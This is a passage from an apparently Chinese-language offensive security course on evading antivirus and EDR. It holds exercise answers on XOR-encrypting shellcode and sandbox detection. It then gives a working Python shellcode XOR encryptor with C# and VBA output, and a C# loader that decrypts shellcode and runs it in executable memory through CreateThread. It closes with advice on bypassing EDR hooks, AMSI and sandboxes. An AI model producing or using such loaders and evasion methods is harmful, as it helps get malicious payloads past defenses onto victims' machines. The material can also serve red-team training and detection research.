### 代码分析题答案

**题目 1**：
1. 功能：使用 XOR 算法加密 shellcode
2. XOR 的特性：A XOR B XOR B = A，相同操作可逆
3. 解密：使用相同的 key 再次 XOR
4. 局限性：单字节密钥容易被破解，加密后的数据仍可能包含特征

**题目 2**：
1. 检测了进程数量和时间加速两个特征
2. 沙箱是隔离环境，通常只运行少量进程
3. 沙箱为了加速分析会跳过 Sleep，导致实际等待时间少于预期
4. 改进：添加更多检测（用户交互、最近文档、域环境等）

## 六、代码汇总

### 6.1 XOR 加密器 (Python)

```python
#!/usr/bin/env python3
"""
Shellcode XOR 加密器
"""

import sys

def xor_encrypt(data, key):
    """XOR 加密/解密"""
    if isinstance(key, int):
        return bytes([b ^ key for b in data])
    else:
        # 多字节密钥
        return bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])

def to_csharp_array(data, var_name="buf"):
    """转换为 C# 数组格式"""
    hex_str = ", ".join([f"0x{b:02x}" for b in data])
    return f"byte[] {var_name} = new byte[] {{ {hex_str} }};"

def to_vba_array(data, var_name="buf"):
    """转换为 VBA 数组格式"""
    lines = []
    line = f"{var_name} = Array("
    for i, b in enumerate(data):
        if i > 0:
            line += ", "
        if len(line) > 80:
            lines.append(line + "_")
            line = "        "
        line += str(b)
    line += ")"
    lines.append(line)
    return "\n".join(lines)

def main():
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <shellcode_file> [key]")
        sys.exit(1)

    with open(sys.argv[1], 'rb') as f:
        shellcode = f.read()

    key = int(sys.argv[2]) if len(sys.argv) > 2 else 0x41

    print(f"[*] Original size: {len(shellcode)} bytes")
    print(f"[*] XOR key: 0x{key:02x}")

    encrypted = xor_encrypt(shellcode, key)

    print("\n// C# format:")
    print(to_csharp_array(encrypted))

    print("\n' VBA format:")
    print(to_vba_array(encrypted))

if __name__ == "__main__":
    main()
```

### 6.2 XOR 解密执行器 (C#)

```csharp
using System;
using System.Runtime.InteropServices;

class Program
{
    [DllImport("kernel32.dll")]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll")]
    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll")]
    static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    static byte[] XorDecrypt(byte[] data, byte key)
    {
        byte[] result = new byte[data.Length];
        for (int i = 0; i < data.Length; i++)
        {
            result[i] = (byte)(data[i] ^ key);
        }
        return result;
    }

    static void Main()
    {
        // 加密的 shellcode
        byte[] encrypted = new byte[] { 0xbd, 0x09, 0xc2, 0xa5, 0xb1, /* ... */ };

        // 解密
        byte key = 0x41;
        byte[] shellcode = XorDecrypt(encrypted, key);

        // 执行
        IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, 0x3000, 0x40);
        Marshal.Copy(shellcode, 0, addr, shellcode.Length);
        IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
        WaitForSingleObject(hThread, 0xFFFFFFFF);
    }
}
```

## 七、实战经验总结

### 7.1 绕过策略选择

```
根据目标环境选择策略:

企业环境 (有 EDR):
├── 使用反射技术避免文件落地
├── 使用 syscall 绕过 API hook
├── 添加沙箱检测
└── 使用合法签名的加载器

个人电脑 (只有杀软):
├── 简单的 XOR 加密可能就够
├── 修改已知工具的特征
└── 使用白名单程序执行

云环境:
├── 注意云安全产品
├── 可能有行为分析
└── 网络流量可能被监控
```

### 7.2 测试建议

```
测试流程:
1. 在无杀软环境测试功能
2. 在 VirusTotal 检查检测率 (注意: 会上传样本)
3. 在虚拟机中测试杀软绕过
4. 在真实环境中小心测试

注意事项:
- 不要在生产环境测试
- 保留原始样本用于对比
- 记录每次修改和结果
- 定期更新绕过技术
```

### 7.3 常见错误

| 错误 | 原因 | 解决方案 |
|------|------|----------|
| 加密后仍被检测 | 解密代码本身有特征 | 混淆解密代码 |
| 沙箱检测失效 | 沙箱更新了 | 添加更多检测方法 |
| 行为检测触发 | API 调用模式可疑 | 使用替代 API 或 syscall |
| AMSI 绕过失败 | 方法被签名 | 使用新的绕过方法 |
